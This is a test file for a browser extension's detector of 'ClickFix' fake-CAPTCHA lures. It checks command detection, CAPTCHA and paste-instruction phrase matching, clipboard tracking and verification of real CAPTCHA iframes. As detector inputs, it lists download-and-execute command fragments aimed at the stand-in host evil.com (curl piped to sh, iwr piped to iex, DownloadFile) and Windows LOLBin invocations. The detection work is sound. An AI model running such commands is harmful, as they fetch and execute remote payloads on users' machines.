// @vitest-environment happy-dom
import { describe, expect, it, beforeEach } from "vitest";
import {
  looksLikeCommand,
  matchesCaptchaPattern,
  matchesInstructionPattern,
  hasLegitCaptcha,
  recordClipboardWrite,
  hasRecentClipboardWrite,
  hasRecentCommandClipboardWrite,
  _resetClipboardEvents,
} from "../extension/src/content/clickfix_detector";

// --- looksLikeCommand ---

describe("looksLikeCommand", () => {
  it("returns false for empty or very short text", () => {
    expect(looksLikeCommand("")).toBe(false);
    expect(looksLikeCommand("hi")).toBe(false);
    expect(looksLikeCommand("abcd")).toBe(false);
  });

  it("detects PowerShell commands", () => {
    expect(looksLikeCommand("powershell -e base64encoded")).toBe(true);
    expect(looksLikeCommand("PowerShell.exe -NoProfile")).toBe(true);
  });

  it("detects cmd commands", () => {
    expect(looksLikeCommand("cmd /c start http://evil.com")).toBe(true);
  });

  it("detects curl and wget", () => {
    expect(looksLikeCommand("curl -sL https://evil.com/payload.sh")).toBe(true);
    expect(looksLikeCommand("wget https://evil.com/malware")).toBe(true);
  });

  it("detects bash and sh", () => {
    expect(looksLikeCommand("bash -c 'curl evil.com | sh'")).toBe(true);
    expect(looksLikeCommand("sh -c download")).toBe(true);
  });

  it("detects mshta and certutil", () => {
    expect(looksLikeCommand("mshta vbscript:Execute")).toBe(true);
    expect(looksLikeCommand("certutil -urlcache -f")).toBe(true);
  });

  it("detects bitsadmin", () => {
    expect(looksLikeCommand("bitsadmin /transfer evil")).toBe(true);
  });

  it("detects rundll32 and regsvr32", () => {
    expect(looksLikeCommand("rundll32 shell32.dll")).toBe(true);
    expect(looksLikeCommand("regsvr32 /s /n malicious.dll")).toBe(true);
  });

  it("detects wscript and cscript", () => {
    expect(looksLikeCommand("wscript malicious.vbs")).toBe(true);
    expect(looksLikeCommand("cscript //nologo script.js")).toBe(true);
  });

  it("detects IEX and Invoke- patterns", () => {
    expect(looksLikeCommand("IEX (New-Object Net.WebClient).DownloadString")).toBe(true);
    expect(looksLikeCommand("Invoke-Expression something")).toBe(true);
    expect(looksLikeCommand("iwr https://evil.com | iex")).toBe(true);
  });

  it("detects Start-Process", () => {
    expect(looksLikeCommand("Start-Process cmd.exe")).toBe(true);
  });

  it("detects DownloadString and DownloadFile", () => {
    expect(looksLikeCommand("(New-Object System.Net.WebClient).DownloadString")).toBe(true);
    expect(looksLikeCommand("client.DownloadFile('http://evil.com', 'payload.exe')")).toBe(true);
  });

  it("detects base64 and -EncodedCommand", () => {
    expect(looksLikeCommand("powershell -EncodedCommand aGVsbG8=")).toBe(true);
    expect(looksLikeCommand("echo aGVsbG8= | base64 -d")).toBe(true);
    expect(looksLikeCommand("[Convert]::FromBase64String")).toBe(true);
  });

  it("detects -enc flag", () => {
    expect(looksLikeCommand("powershell -enc aGVsbG8=")).toBe(true);
  });

  it("detects LOLBins: forfiles, schtasks, installutil, pcalua", () => {
    expect(looksLikeCommand("forfiles /p c:\\windows /c cmd")).toBe(true);
    expect(looksLikeCommand("schtasks /create /tn evil")).toBe(true);
    expect(looksLikeCommand("installutil /LogFile= payload.dll")).toBe(true);
    expect(looksLikeCommand("pcalua -a calc.exe")).toBe(true);
  });

  it("detects macOS osascript", () => {
    expect(looksLikeCommand("osascript -e 'do shell script'")).toBe(true);
  });

  it("does NOT flag standalone pipe in plain text", () => {
    expect(looksLikeCommand("Column A | Column B | Column C")).toBe(false);
  });

  it("does NOT flag bare URLs (reduces false positives on link copies)", () => {
    expect(looksLikeCommand("Visit http://evil.com/payload")).toBe(false);
    expect(looksLikeCommand("Download https://evil.com")).toBe(false);
    expect(looksLikeCommand("https://example.com/page")).toBe(false);
  });

  it("still detects URLs combined with command keywords", () => {
    expect(looksLikeCommand("curl https://evil.com/payload.sh")).toBe(true);
    expect(looksLikeCommand("wget http://evil.com/malware")).toBe(true);
  });

  it("detects /bin/ paths", () => {
    expect(looksLikeCommand("/bin/bash -c script")).toBe(true);
  });

  it("detects New-Object", () => {
    expect(looksLikeCommand("$c = New-Object System.Net.WebClient")).toBe(true);
  });

  it("detects System.Net namespace", () => {
    expect(looksLikeCommand("System.Net.WebClient download")).toBe(true);
  });

  it("does NOT flag plain text", () => {
    expect(looksLikeCommand("Hello world, this is a normal sentence.")).toBe(false);
    expect(looksLikeCommand("Please verify your email")).toBe(false);
    expect(looksLikeCommand("Click the button to continue")).toBe(false);
  });

  it("does NOT flag words containing keyword substrings", () => {
    // "cmd" should not match inside "command"
    expect(looksLikeCommand("Run this command now")).toBe(false);
    // "iex" should not match inside "index"
    expect(looksLikeCommand("See the index page for details")).toBe(false);
    // "curl" should not match inside "curling"
    expect(looksLikeCommand("Going curling this weekend")).toBe(false);
    // "wget" should not match inside "widget"
    expect(looksLikeCommand("A simple wget-like tool")).toBe(false);
  });

  it("does NOT flag short innocuous text", () => {
    expect(looksLikeCommand("12345")).toBe(false);
    expect(looksLikeCommand("ABCDE")).toBe(false);
  });

  it("is case-insensitive", () => {
    expect(looksLikeCommand("POWERSHELL -e encoded")).toBe(true);
    expect(looksLikeCommand("CURL http://evil")).toBe(true);
    expect(looksLikeCommand("WGET http://evil")).toBe(true);
  });
});

// --- matchesCaptchaPattern ---

describe("matchesCaptchaPattern", () => {
  it("matches 'verify you are human'", () => {
    expect(matchesCaptchaPattern("Verify you are human")).toBe(true);
    expect(matchesCaptchaPattern("Please verify you are a human")).toBe(true);
  });

  it("matches 'prove you're not a robot'", () => {
    expect(matchesCaptchaPattern("Prove you're not a robot")).toBe(true);
    expect(matchesCaptchaPattern("Prove you are not a robot")).toBe(true);
  });

  it("matches 'I am not a robot'", () => {
    expect(matchesCaptchaPattern("I am not a robot")).toBe(true);
    expect(matchesCaptchaPattern("I'm not a robot")).toBe(true);
  });

  it("matches 'human verification'", () => {
    expect(matchesCaptchaPattern("Human Verification Required")).toBe(true);
  });

  it("matches 'security verification'", () => {
    expect(matchesCaptchaPattern("Security verification")).toBe(true);
  });

  it("matches 'captcha verification'", () => {
    expect(matchesCaptchaPattern("CAPTCHA Verification")).toBe(true);
  });

  it("matches 'anti-bot verification'", () => {
    expect(matchesCaptchaPattern("Anti-Bot Verification")).toBe(true);
    expect(matchesCaptchaPattern("antibot verification")).toBe(true);
  });

  it("matches 'confirm you are human'", () => {
    expect(matchesCaptchaPattern("Please confirm you are a human")).toBe(true);
  });

  it("matches various verify+bot patterns", () => {
    expect(matchesCaptchaPattern("Verify that you are not a bot")).toBe(true);
    expect(matchesCaptchaPattern("Verify you are not a robot")).toBe(true);
  });

  it("does NOT match unrelated text", () => {
    expect(matchesCaptchaPattern("Welcome to our website")).toBe(false);
    expect(matchesCaptchaPattern("Please enter your password")).toBe(false);
    expect(matchesCaptchaPattern("Click here to continue")).toBe(false);
  });

  it("does NOT match 'robot' in other contexts", () => {
    expect(matchesCaptchaPattern("Buy a robot vacuum today")).toBe(false);
    expect(matchesCaptchaPattern("Robot programming tutorial")).toBe(false);
  });

  it("is case-insensitive", () => {
    expect(matchesCaptchaPattern("VERIFY YOU ARE HUMAN")).toBe(true);
    expect(matchesCaptchaPattern("security VERIFICATION")).toBe(true);
  });
});

// --- matchesInstructionPattern ---

describe("matchesInstructionPattern", () => {
  it("matches 'press Win+R'", () => {
    expect(matchesInstructionPattern("Press Win+R to open Run")).toBe(true);
  });

  it("matches 'press Ctrl+V'", () => {
    expect(matchesInstructionPattern("Press Ctrl+V to paste")).toBe(true);
  });

  it("matches 'open terminal'", () => {
    expect(matchesInstructionPattern("Open terminal and paste")).toBe(true);
    expect(matchesInstructionPattern("Open a Run dialog")).toBe(true);
    expect(matchesInstructionPattern("Open Command Prompt")).toBe(true);
    expect(matchesInstructionPattern("Open a PowerShell window")).toBe(true);
  });

  it("matches paste into run/terminal instructions", () => {
    expect(matchesInstructionPattern("Paste it into the Run dialog")).toBe(true);
    expect(matchesInstructionPattern("Paste into the terminal window")).toBe(true);
    expect(matchesInstructionPattern("Paste it in the command prompt")).toBe(true);
  });

  it("matches 'Windows+R'", () => {
    expect(matchesInstructionPattern("Press Windows+R")).toBe(true);
  });

  it("matches 'Cmd+Space'", () => {
    expect(matchesInstructionPattern("Press Cmd+Space to open Spotlight")).toBe(true);
  });

  it("matches 'Win R' (space-separated)", () => {
    expect(matchesInstructionPattern("Press Win R to open")).toBe(true);
  });

  it("matches 'copy and paste'", () => {
    expect(matchesInstructionPattern("Copy and paste the verification code")).toBe(true);
  });

  it("matches 'press Enter to verify/confirm/continue'", () => {
    expect(matchesInstructionPattern("Press Enter to verify")).toBe(true);
    expect(matchesInstructionPattern("Press Enter to confirm")).toBe(true);
    expect(matchesInstructionPattern("Press Enter to continue")).toBe(true);
  });

  it("matches 'click verify then paste'", () => {
    expect(matchesInstructionPattern("Click the verify button then paste")).toBe(true);
    expect(matchesInstructionPattern("Click checkbox and press Enter")).toBe(true);
  });

  it("matches 'right-click paste'", () => {
    expect(matchesInstructionPattern("Right-click and paste")).toBe(true);
    expect(matchesInstructionPattern("Right click paste")).toBe(true);
    expect(matchesInstructionPattern("Rightclick paste")).toBe(true);
  });

  it("matches Unicode Win key symbol", () => {
    expect(matchesInstructionPattern("Press ⊞+R to open Run")).toBe(true);
  });

  it("does NOT match normal instructions", () => {
    expect(matchesInstructionPattern("Click the button to continue")).toBe(false);
    expect(matchesInstructionPattern("Enter your email address")).toBe(false);
    expect(matchesInstructionPattern("Press the login button")).toBe(false);
  });

  it("does NOT match 'copy' in unrelated contexts", () => {
    expect(matchesInstructionPattern("Copyright 2024 All rights reserved")).toBe(false);
  });

  it("is case-insensitive", () => {
    expect(matchesInstructionPattern("PRESS WIN+R")).toBe(true);
    expect(matchesInstructionPattern("COPY AND PASTE")).toBe(true);
    expect(matchesInstructionPattern("OPEN TERMINAL")).toBe(true);
  });
});

// --- Clipboard event tracking ---

describe("clipboard event tracking", () => {
  beforeEach(() => {
    _resetClipboardEvents();
  });

  it("records clipboard writes and detects them", () => {
    expect(hasRecentClipboardWrite()).toBe(false);
    recordClipboardWrite({ ts: Date.now(), contentLength: 100, looksLikeCommand: false });
    expect(hasRecentClipboardWrite()).toBe(true);
  });

  it("tracks command-like clipboard writes", () => {
    recordClipboardWrite({ ts: Date.now(), contentLength: 50, looksLikeCommand: true });
    expect(hasRecentCommandClipboardWrite()).toBe(true);
  });

  it("returns false for command writes when none are command-like", () => {
    recordClipboardWrite({ ts: Date.now(), contentLength: 50, looksLikeCommand: false });
    expect(hasRecentCommandClipboardWrite()).toBe(false);
  });

  it("prunes events older than 30s TTL", () => {
    recordClipboardWrite({
      ts: Date.now() - 60_000,
      contentLength: 50,
      looksLikeCommand: true,
    });
    expect(hasRecentClipboardWrite()).toBe(false);
    expect(hasRecentCommandClipboardWrite()).toBe(false);
  });

  it("keeps events within TTL", () => {
    recordClipboardWrite({
      ts: Date.now() - 5_000,
      contentLength: 50,
      looksLikeCommand: true,
    });
    expect(hasRecentClipboardWrite()).toBe(true);
    expect(hasRecentCommandClipboardWrite()).toBe(true);
  });

  it("limits to 5 events", () => {
    const now = Date.now();
    for (let i = 0; i < 10; i++) {
      recordClipboardWrite({
        ts: now,
        contentLength: i * 10,
        looksLikeCommand: i === 9,
      });
    }
    // After 10 inserts, the last 5 should remain (indices 5-9)
    expect(hasRecentClipboardWrite()).toBe(true);
    // The command-like write was at index 9 (the last one), so it should be present
    expect(hasRecentCommandClipboardWrite()).toBe(true);
  });

  it("loses early command-like events when max is exceeded", () => {
    const now = Date.now();
    // Only the first event is command-like
    recordClipboardWrite({ ts: now, contentLength: 100, looksLikeCommand: true });
    for (let i = 0; i < 5; i++) {
      recordClipboardWrite({ ts: now, contentLength: 10, looksLikeCommand: false });
    }
    // The command-like event should have been evicted
    expect(hasRecentClipboardWrite()).toBe(true);
    expect(hasRecentCommandClipboardWrite()).toBe(false);
  });

  it("resets correctly", () => {
    recordClipboardWrite({ ts: Date.now(), contentLength: 100, looksLikeCommand: true });
    expect(hasRecentClipboardWrite()).toBe(true);
    _resetClipboardEvents();
    expect(hasRecentClipboardWrite()).toBe(false);
  });

  it("handles mixed command and non-command writes", () => {
    const now = Date.now();
    recordClipboardWrite({ ts: now, contentLength: 50, looksLikeCommand: false });
    recordClipboardWrite({ ts: now, contentLength: 200, looksLikeCommand: true });
    recordClipboardWrite({ ts: now, contentLength: 30, looksLikeCommand: false });
    expect(hasRecentClipboardWrite()).toBe(true);
    expect(hasRecentCommandClipboardWrite()).toBe(true);
  });
});

// --- hasLegitCaptcha hardening ---

describe("hasLegitCaptcha", () => {
  it("returns false for bare class name without provider iframe", () => {
    const div = document.createElement("div");
    div.innerHTML = '<div class="g-recaptcha"><span>fake</span></div>';
    expect(hasLegitCaptcha(div)).toBe(false);
  });

  it("returns true when class name is backed by provider iframe", () => {
    const div = document.createElement("div");
    div.innerHTML = '<div class="g-recaptcha"><iframe src="https://www.google.com/recaptcha/api2/anchor"></iframe></div>';
    expect(hasLegitCaptcha(div)).toBe(true);
  });

  it("returns true for standalone provider iframe without class", () => {
    const div = document.createElement("div");
    div.innerHTML = '<iframe src="https://www.google.com/recaptcha/api2/anchor"></iframe>';
    expect(hasLegitCaptcha(div)).toBe(true);
  });

  it("returns true for hCaptcha iframe", () => {
    const div = document.createElement("div");
    div.innerHTML = '<iframe src="https://hcaptcha.com/challenge"></iframe>';
    expect(hasLegitCaptcha(div)).toBe(true);
  });

  it("returns true for Cloudflare Turnstile iframe", () => {
    const div = document.createElement("div");
    div.innerHTML = '<iframe src="https://challenges.cloudflare.com/turnstile"></iframe>';
    expect(hasLegitCaptcha(div)).toBe(true);
  });

  it("returns false for empty root", () => {
    const div = document.createElement("div");
    expect(hasLegitCaptcha(div)).toBe(false);
  });

  it("detects provider iframe as sibling of class-name element", () => {
    const wrapper = document.createElement("div");
    wrapper.innerHTML = '<div><div class="g-recaptcha"></div><iframe src="https://www.google.com/recaptcha/api2/anchor"></iframe></div>';
    expect(hasLegitCaptcha(wrapper)).toBe(true);
  });
});
